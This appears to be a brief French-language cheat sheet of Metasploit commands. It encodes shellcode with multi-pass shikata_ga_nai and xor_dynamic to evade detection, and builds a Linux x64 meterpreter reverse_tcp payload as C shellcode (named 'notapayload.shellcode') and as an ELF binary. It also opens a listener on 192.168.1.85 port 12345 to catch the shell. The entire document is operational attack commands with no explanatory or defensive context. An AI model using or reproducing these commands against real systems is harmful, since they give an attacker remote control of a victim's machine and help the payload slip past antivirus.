##Commande msfvenom : 

x86:
`msfvenom -e x86/shikata_ga_nai --platform Linux -i 10 -f c -a x86 -o asm01_x86.shellcode < asm01.bin`

x64:
`msfvenom -e x64/xor_dynamic --platform Linux -i 10 -f c -a x64 -o asm01_x64.shellcode < asm01.bin`

générer un reverse shell (shellcode) : `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.85 LPORT=12345 -f c > notapayload.shellcode`

générer un reverse shell: `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.85 LPORT=12345 -f elf > shell.elf`
and launch it with `./shell.elf` (dont forget a chmod u+x ./shell.elf)

ouvrir un listener : `msfconsole -q` > `set payload linux/x64/meterpreter/reverse_tcp` >
`set lhost 192.168.1.85` > `set lport 12345` > `run`